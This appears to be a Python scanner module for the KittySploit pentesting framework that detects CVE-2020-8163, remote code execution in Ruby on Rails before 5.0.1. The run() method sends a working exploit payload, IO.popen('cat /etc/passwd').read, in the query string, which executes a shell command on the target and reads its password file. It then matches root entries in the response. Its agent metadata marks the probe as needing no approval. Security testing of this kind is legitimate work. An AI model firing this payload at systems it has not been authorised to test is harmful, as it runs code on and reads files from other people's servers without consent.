#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ruby on Rails before version 5."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ruby on Rails <5.0.1 - Remote Code Execution Detection',
        'description': 'Ruby on Rails before version 5.0.1 is susceptible to remote code execution because it passes user parameters as local variables into partials.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'rails', 'rce', 'hackerone', 'rubyonrails', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://hackerone.com/reports/304805',
            'https://groups.google.com/g/rubyonrails-security/c/hWuKcHyoKh0',
            'https://lists.debian.org/debian-lts-announce/2020/07/msg00013.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-8163',
        ],
        'cve': 'CVE-2020-8163',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Ruby on Rails <5.0.1 - Remote Code Execution detected",
                path='/?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23',
            )
            return True
        return False

